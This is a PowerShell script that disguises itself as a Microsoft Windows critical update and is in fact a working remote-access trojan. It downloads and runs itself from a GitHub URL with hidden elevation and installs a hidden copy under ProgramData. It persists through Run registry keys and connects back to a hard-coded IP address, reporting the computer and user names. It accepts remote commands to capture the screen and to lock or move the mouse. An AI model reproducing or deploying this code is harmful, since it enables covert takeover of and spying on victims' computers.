<#
.SYNOPSIS
Windows Critical System Component
.DESCRIPTION
Microsoft Windows Critical Update Module
.NOTES
Version: 10.0.19045.1
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.204"
$serverPort = 4000
$installName = "WinUpdateSvc"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

# ===== VERIFICAR ADMIN =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    try {
        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue
    } catch {}
    exit
}

# ===== PERSISTÊNCIA =====
$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force -ErrorAction SilentlyContinue | Out-Null
try {
    (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath)
} catch {}

try {
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
} catch {}

attrib +h +s +r $scriptPath 2>$null

# ===== FUNÇÕES BASICAS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose(); $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREEN:$base64"
    } catch { return "SCREEN_ERROR" }
}

function Lock-Mouse {
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        while($true) {
            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)
            Start-Sleep -Milliseconds 10
        }
    } | Out-Null
    return "MOUSE_LOCKED"
}

function Unlock-Mouse {
    Get-Job | Where-Object { $_.State -eq 'Running' } | Stop-Job -ErrorAction SilentlyContinue
    Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
    return "MOUSE_UNLOCKED"
}

function Move-Mouse {
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch { return "MOUSE_ERROR" }
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    $client = $null; $stream = $null; $reader = $null; $writer = $null
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($serverIP, $serverPort)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
        $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true
        
        # Pega a resolução da tela real
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        
        # Envia o BANNER (igual o .exe espera)
        $writer.WriteLine("BANNER:$env:COMPUTERNAME@$env:USERNAME|$($bounds.Width)|$($bounds.Height)|$isAdmin")
        
        while ($client.Connected) {
            if ($stream.DataAvailable) {
                $cmd = $reader.ReadLine()
                if ([string]::IsNullOrEmpty($cmd)) { continue }
                
                $response = ""
                switch -Wildcard ($cmd) {
                    "screenshot"   { $response = Get-ScreenCapture }
                    "lock_mouse"   { $response = Lock-Mouse }
                    "unlock_mouse" { $response = Unlock-Mouse }
                    "move *"       { $p = $cmd -split " "; $response = Move-Mouse $p[1] $p[2] }
                    "test"         { $response = "PONG" }
                    "exit"         { $client.Close(); break }
                    default        { $response = "UNKNOWN: $cmd" }
                }
                
                if ($response) { 
                    $writer.WriteLine($response)
                    $writer.Flush() 
                }
            } else {
                Start-Sleep -Milliseconds 20
            }
        }
    } catch {
        # Falha de conexão silenciosa, tenta de novo em 5s
    } finally {
        if ($reader) { $reader.Dispose() }
        if ($writer) { $writer.Dispose() }
        if ($stream) { $stream.Dispose() }
        if ($client) { $client.Close() }
    }
    Start-Sleep -Seconds 5
}
